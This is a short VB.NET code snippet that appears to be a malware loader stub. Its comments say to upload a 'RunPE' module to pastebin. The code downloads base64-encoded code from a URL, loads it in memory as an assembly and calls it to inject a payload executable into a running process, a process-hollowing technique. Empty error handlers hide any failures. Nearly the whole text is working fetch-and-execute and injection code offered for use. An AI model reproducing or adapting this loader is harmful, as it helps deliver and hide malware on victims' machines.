  'Upload RunPE to pastebin and replace the URL
  '
  'Usage :
  '
  'Dim Payload As Byte() = IO.Files.ReadAllBytes("C:\YourPayload.exe")
  'Dim Payload As Byte() = My.Resources.YourPayload
  '
  'Load(Payload)


Public Shared Sub Load(ByVal Payload As Byte())
  Try
    Assembly.Load(LoadFile("http://127.0.0.1/RunPE.txt")).GetType("RunPE.Run").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
  Catch
  End Try
End Sub
    
Public Shared Function LoadFile(ByVal url As String) As Byte()
  Try
    Dim WC As New WebClient
    Dim WB As String = WC.DownloadString(url)
    Return Convert.FromBase64String(WB)
  Catch
    Return Nothing
  End Try
End Function
